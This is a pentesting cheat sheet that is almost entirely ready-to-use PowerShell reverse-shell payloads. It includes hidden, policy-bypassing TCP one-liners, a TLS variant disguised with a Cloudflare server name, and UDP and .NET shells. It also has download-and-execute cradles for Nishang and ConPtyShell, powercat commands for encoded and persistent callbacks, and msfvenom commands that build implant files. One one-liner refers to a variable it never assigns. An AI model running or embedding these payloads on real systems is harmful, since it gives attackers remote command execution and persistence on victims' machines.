# PowerShell

## 01 - Regular

### 1.1. - Command Prompt

Verbosed one-liner.

```powershell
C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('<attacker_IP>', <attacker_PORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (Invoke-Expression $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '; $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()"
```

Shorter one-liner.

```powershell
C:\> powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('<attacker_IP>', <attacker_PORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (IEX $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()"
```

### 1.2 - PowerShell

Verbosed one-liner.

```powershell
$LHOST = '<attacker_ip>'; $LPORT = <attacker_PORT>; $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object System.IO.StreamReader($NetworkStream); $StreamWriter = New-Object System.IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([System.Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write('$Output`n'); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Shorter one-liner.

```powershell
PS C:\> $client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()
```

## 02 - TLS PowerShell

```powershell
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('<attacker_IP>', <attacker_PORT>); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({ $true } -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient('cloudflare-dns.com', $null, $sslProtocols, $false); if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) { $SslStream.Close(); exit} $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) { [byte[]]$script:Buffer = New-Object System.Byte[] 4096; $StreamWriter.Write($String + 'PS' + (Get-Location).Path '> '); $StreamWriter.Flush() }; WriteToStream ''; while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String } WriteToStream ($Output) } $StreamWriter.Close()
```

## 03 - .NET

```powershell
PS C:\> $client = [System.Net.Sockets.TcpClient]::new("<IP>", "<PORT>"); $stream = $client.GetStream(); $reader = [System.IO.StreamReader]::new($stream); $writer = [System.IO.StreamWriter]::new($stream); while ($client.Connected) { while ($stream.DataAvailable) { $command = $reader.ReadLine(); $output = (Invoke-Expression $command) 2>&1 | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); } }
```

## 04 - Nishang

### 4.1 - TCP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')

Invoke-PowerShellTcp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
```

### 4.2 - UDP Method

One-liner UDP reverse shell.

```powershell
PS C:\> $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("<attacker_IP>"), <attacker_PORT>);$client = New-Object System.Net.Sockets.UDPClient(53);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS> ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([text.encoding]::ASCII).GetString($receivebytes);$sendback = (iex $returndata 2>&1 | Out-String );$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()
```

Download cradle through memory.

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')

Invoke-PowerShellUdp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
```

### 4.3 - ICMP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1')

Invoke-PowerShellIcmp -IPAddress <attacker_IP>
```

## 04 - Generate via `powercat`

Generate reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -g
```

Generate base64 encoded reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -ge
```

Persist callback shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -rep
```

## 05 - Generate via `msfvenom`

### 5.1 - x86 (32-bit) Payloads

```
$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o implant.bat
```

You can load powershell scripts ahead of time.

```
$ msfvenom -p cmd/windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1

$ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1
```

### 5.2 - x86-64 (64-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p windows/x64/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell-x64.ps1
```

## 06 - Fully Interactive PowerShell

^d57486

### 6.1 - Method One

This will set the terminal size automatically without passing the `rows` and `cols` manually.

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <attacker_IP> <attacker_PORT>
```

### 6.2 - Method Two

When you encounter an problem to ensure that the `cols` and `rows` are set manually. Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <attacker_IP> -RemotePort <attacker_PORT> -Rows <rows> -Cols <columns>
```

### 6.3 - Method Three

Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`.

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows <rows> -Cols <columns>
```

---
## References

### Github

- [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

- [samratashok: Nishang](https://github.com/samratashok/nishang)

- [Powercat](https://github.com/besimorhino/powercat)

- [antonioCoco: ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

### Hacktricks

- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)

### Ironhackers

- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)